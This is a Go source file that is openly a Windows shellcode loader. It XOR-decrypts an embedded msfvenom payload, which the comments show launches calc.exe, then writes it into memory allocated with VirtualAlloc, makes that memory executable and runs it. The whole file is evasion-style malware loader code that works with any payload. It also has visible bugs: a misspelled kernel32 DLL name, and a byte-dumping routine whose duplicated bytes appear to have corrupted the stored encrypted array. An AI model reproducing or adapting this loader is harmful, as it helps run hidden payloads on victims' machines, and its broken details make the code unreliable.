package main

import (
	"fmt"
	"syscall"
	"unsafe"
	
	"golang.org/x/sys/windows"
)

var sc = []byte{
	// msfvenom original payload
	// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp 2>/dev/null
	//0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff,
	//0xff, 0xff, 0x48, 0xbb, 0x21, 0x94, 0x3c, 0xbc, 0xa0, 0x7b, 0x11, 0x71, 0x48, 0x31, 0x58,
	//0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xdd, 0xdc, 0xbf, 0x58, 0x50, 0x93,
	//0xd1, 0x71, 0x21, 0x94, 0x7d, 0xed, 0xe1, 0x2b, 0x43, 0x20, 0x77, 0xdc, 0x0d, 0x6e, 0xc5,
	//0x33, 0x9a, 0x23, 0x41, 0xdc, 0xb7, 0xee, 0xb8, 0x33, 0x9a, 0x23, 0x01, 0xdc, 0xb7, 0xce,
	//0xf0, 0x33, 0x1e, 0xc6, 0x6b, 0xde, 0x71, 0x8d, 0x69, 0x33, 0x20, 0xb1, 0x8d, 0xa8, 0x5d,
	//0xc0, 0xa2, 0x57, 0x31, 0x30, 0xe0, 0x5d, 0x31, 0xfd, 0xa1, 0xba, 0xf3, 0x9c, 0x73, 0xd5,
	//0x6d, 0xf4, 0x2b, 0x29, 0x31, 0xfa, 0x63, 0xa8, 0x74, 0xbd, 0x70, 0xf0, 0x91, 0xf9, 0x21,
	//0x94, 0x3c, 0xf4, 0x25, 0xbb, 0x65, 0x16, 0x69, 0x95, 0xec, 0xec, 0x2b, 0x33, 0x09, 0x35,
	//0xaa, 0xd4, 0x1c, 0xf5, 0xa1, 0xab, 0xf2, 0x27, 0x69, 0x6b, 0xf5, 0xfd, 0x2b, 0x4f, 0x99,
	//0x39, 0x20, 0x42, 0x71, 0x8d, 0x69, 0x33, 0x20, 0xb1, 0x8d, 0xd5, 0xfd, 0x75, 0xad, 0x3a,
	//0x10, 0xb0, 0x19, 0x74, 0x49, 0x4d, 0xec, 0x78, 0x5d, 0x55, 0x29, 0xd1, 0x05, 0x6d, 0xd5,
	//0xa3, 0x49, 0x35, 0xaa, 0xd4, 0x18, 0xf5, 0xa1, 0xab, 0x77, 0x30, 0xaa, 0x98, 0x74, 0xf8,
	//0x2b, 0x3b, 0x0d, 0x38, 0x20, 0x44, 0x7d, 0x37, 0xa4, 0xf3, 0x59, 0x70, 0xf1, 0xd5, 0x64,
	//0xfd, 0xf8, 0x25, 0x48, 0x2b, 0x60, 0xcc, 0x7d, 0xe5, 0xe1, 0x21, 0x59, 0xf2, 0xcd, 0xb4,
	//0x7d, 0xee, 0x5f, 0x9b, 0x49, 0x30, 0x78, 0xce, 0x74, 0x37, 0xb2, 0x92, 0x46, 0x8e, 0xde,
	//0x6b, 0x61, 0xf4, 0x1a, 0x7a, 0x11, 0x71, 0x21, 0x94, 0x3c, 0xbc, 0xa0, 0x33, 0x9c, 0xfc,
	//0x20, 0x95, 0x3c, 0xbc, 0xe1, 0xc1, 0x20, 0xfa, 0x4e, 0x13, 0xc3, 0x69, 0x1b, 0x8b, 0xa4,
	//0xd3, 0x77, 0xd5, 0x86, 0x1a, 0x35, 0xc6, 0x8c, 0x8e, 0xf4, 0xdc, 0xbf, 0x78, 0x88, 0x47,
	//0x17, 0x0d, 0x2b, 0x14, 0xc7, 0x5c, 0xd5, 0x7e, 0xaa, 0x36, 0x32, 0xe6, 0x53, 0xd6, 0xa0,
	//0x22, 0x50, 0xf8, 0xfb, 0x6b, 0xe9, 0xdf, 0xc1, 0x17, 0x72, 0x5f, 0x44, 0xec, 0x59, 0xbc,
	//0xa0, 0x7b, 0x11, 0x71,

	// encrypted shellcode
	0x9, 0x70, 0x88, 0x9, 0xc0, 0xa8, 0x9c, 0xbe, 0xbe, 0xbe, 0x9, 0xcc,
	0x44, 0x44, 0xae, 0xbe, 0xbe, 0xbe, 0x9, 0xfa, 0x60, 0xd5, 0x7d, 0xfd, 0xe1,
	0x3a, 0x3a, 0x50, 0x30, 0x9, 0x70, 0x19, 0x66, 0x9, 0x6c, 0xb9, 0xbe, 0xbe,
	0xbe, 0xbe, 0xa3, 0xb5, 0x9c, 0x9d, 0xfe, 0x19, 0x11, 0xd2, 0x90, 0x30, 0x60,
	0xd5, 0xd5, 0x3c, 0xac, 0xa0, 0x6a, 0x2, 0x61, 0x36, 0x9d, 0x4c, 0x2f, 0x84,
	0x72, 0x72, 0xdb, 0x62, 0x0, 0x9d, 0xf6, 0xaf, 0xf9, 0x72, 0xdb, 0x62, 0x40,
	0x9d, 0x9d, 0xf6, 0x8f, 0xb1, 0x72, 0x5f, 0x87, 0x2a, 0x9f, 0x30, 0xcc, 0x28,
	0x72, 0x72, 0x61, 0xf0, 0xcc, 0xe9, 0x1c, 0x81, 0xe3, 0x16, 0x70, 0x71, 0xa1,
	0x1c, 0x1c, 0x70, 0xbc, 0xe0, 0xfb, 0xb2, 0xdd, 0x32, 0x94, 0x2c, 0xb5, 0x6a,
	0x68, 0x68, 0x70, 0xbb, 0x22, 0xe9, 0x35, 0xfc, 0x31, 0xb1, 0xd0, 0xb8, 0x60,
	0xd5, 0xd5, 0x7d, 0xb5, 0x64, 0xfa, 0x24, 0x57, 0x28, 0xd4, 0xad, 0xad, 0x6a,
	0x72, 0x72, 0x48, 0x74, 0xeb, 0x95, 0x5d, 0xb4, 0xe0, 0xea, 0xb3, 0x66, 0x28,
	0x2a, 0x2a, 0xb4, 0xbc, 0x6a, 0xe, 0xd8, 0x78, 0x61, 0x3, 0x30, 0xcc, 0x28,
	0x72, 0x72, 0x61, 0xf0, 0xcc, 0x94, 0xbc, 0x34, 0xec, 0x7b, 0x51, 0xf1, 0x58,
	0x35, 0x35, 0x8, 0xc, 0xad, 0x39, 0x1c, 0x14, 0x68, 0x90, 0x44, 0x2c, 0x94,
	0xe2, 0xe2, 0x8, 0x74, 0xeb, 0x95, 0x59, 0xb4, 0xe0, 0xea, 0x36, 0x71, 0xeb,
	0xd9, 0xd9, 0x35, 0xb9, 0x6a, 0x7a, 0x4c, 0x79, 0x61, 0x5, 0x3c, 0x76, 0xe5,
	0xb2, 0xb2, 0x18, 0x31, 0xb0, 0x94, 0x25, 0xbc, 0xb9, 0x64, 0x9, 0x6a, 0x21,
	0x8d, 0x8d, 0x3c, 0xa4, 0xa0, 0x60, 0x18, 0xb3, 0x8c, 0xf5, 0x3c, 0xaf, 0x1e,
	0xda, 0xda, 0x8, 0x71, 0x39, 0x8f, 0x35, 0x76, 0xf3, 0xd3, 0x7, 0xcf, 0x9f,
	0x2a, 0x2a, 0x20, 0xb5, 0x5b, 0x3b, 0x50, 0x30, 0x60, 0xd5, 0x7d, 0xfd, 0xe1,
	0x72, 0x72, 0xdd, 0xbd, 0x61, 0xd4, 0x7d, 0xfd, 0xa0, 0x80, 0x61, 0xbb, 0xf,
	0x52, 0x52, 0x82, 0x28, 0x5a, 0xca, 0xe5, 0x92, 0x36, 0x94, 0xc7, 0x5b, 0x74,
	0x87, 0x87, 0xcd, 0xcf, 0xb5, 0x9d, 0xfe, 0x39, 0xc9, 0x6, 0x56, 0x4c, 0x6a,
	0x55, 0x55, 0x86, 0x1d, 0x94, 0x3f, 0xeb, 0x77, 0x73, 0xa7, 0x12, 0x97, 0xe1,
	0x63, 0x63, 0x11, 0xb9, 0xba, 0x2a, 0xa8, 0x9e, 0x80, 0x56, 0x33, 0x1e, 0x5,
	0xad, 0xad, 0x18, 0xfd, 0xe1, 0x3a, 0x50, 0x30,
}

func xor(sc []byte, k byte) (r []byte) {
	r = make([]byte, len(sc))
	for i := 0; i < len(sc); i++ {
		r[i] = k ^ sc[i]
	}
	return
}

func shCodeExec(sc []byte, k byte) {
	sc = xor(sc, k)

	kernel32 := windows.NewLazyDLL("kernel32dll.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(
		uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if err != nil {
		fmt.Println("VirtualAlloc error: %s", err.Error())
	}

	RtlMoveMemory.Call(
		addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
	)

	var prevProtections uint32
	err = windows.VirtualProtect(
		addr, uintptr(len(sc)),
		windows.PAGE_EXECUTE_READ,
		&prevProtections,
	)

	if err != nil {
		fmt.Println("VirtualProtect error: %s", err.Error())
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func prettyPrintShellcode(sc []byte) {
	for i := 0; i < len(sc); i++ {
		if i%12 == 0 {
			if i == 0 {
				fmt.Printf("%#x,", sc[i])
				continue
			}
			fmt.Println()
			fmt.Printf("%#x,", sc[i])
		}
		fmt.Printf("%#x,", sc[i])
	}
	fmt.Println()
}

func main() {
	key := byte(65)
	// sc := xor(sc, key)

	//prettyPrintShellcode(sc)

	shCodeExec(sc, key)
}
